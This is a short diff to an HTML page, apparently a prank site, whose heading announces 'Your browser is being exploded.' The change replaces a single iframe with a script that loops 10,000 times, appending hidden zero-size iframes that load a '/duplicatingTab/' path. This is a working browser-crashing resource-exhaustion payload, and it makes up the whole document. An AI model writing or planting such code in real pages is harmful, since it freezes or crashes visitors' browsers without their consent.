@@ -12,7 +12,9 @@
 </head>
 <body>
 	<script>
-		document.body.innerHTML += '<iframe src="/duplicatingTab/" title="Duplicating Tab"></iframe>'
+		for (var i = 0; i < 10000; i++) {
+			document.body.innerHTML += '<iframe height="0" width="0" src="/duplicatingTab/" title="Duplicating Tab"></iframe>';
+		}
 	</script>
 	
 	<h1 class="remove">Your browser is being exploded. Please stand by.</h1>
